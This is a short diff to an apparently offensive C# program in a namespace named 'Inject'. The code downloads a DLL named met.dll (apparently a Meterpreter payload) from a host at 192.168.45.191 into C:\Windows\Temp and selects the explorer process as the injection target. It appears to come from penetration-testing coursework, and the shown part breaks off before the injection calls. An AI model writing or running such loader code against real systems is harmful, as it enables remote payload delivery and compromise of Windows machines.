@@ -29,12 +29,15 @@ namespace Inject
         static void Main(string[] args)
         {
 
-            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            // Set the download directory for the DLL file ('C:\Windows\Temp\met.dll').
+            String dir = "C:\\Windows\\Temp";
             String dllName = dir + "\\met.dll";
 
+            // Set the remote web server to download the DLL from.
             WebClient wc = new WebClient();
             wc.DownloadFile("http://192.168.45.191/met.dll", dllName);
 
+            // Set the Windows process to inject the DLL into.
             Process[] expProc = Process.GetProcessesByName("explorer");
             int pid = expProc[0].Id;
 
